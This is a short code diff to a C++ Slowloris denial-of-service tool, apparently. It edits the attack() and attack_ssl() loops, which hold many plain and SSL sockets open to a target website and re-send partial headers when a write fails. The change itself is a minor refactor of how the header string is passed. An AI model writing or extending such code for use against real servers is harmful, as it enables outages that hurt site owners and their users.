@@ -1,6 +1,4 @@
 #include <netdb.h>
-#include <cstring>
-#include <utility>
 #include <openssl/ssl.h>
 
 #include "../Headers/Slowloris.hpp"
@@ -19,7 +17,7 @@ void Slowloris::attack() {
                 init_header(&header);
             }
 
-            if((write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
+            if((write_socket(sockets[x], header.get(), static_cast<int>(header.length()))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 init_header(&header);
@@ -58,7 +56,7 @@ void Slowloris::attack_ssl() {
                 init_header(&header);
             }
 
-            if((write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
+            if((write_socket(SSLs[x], header.get(), static_cast<int>(header.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
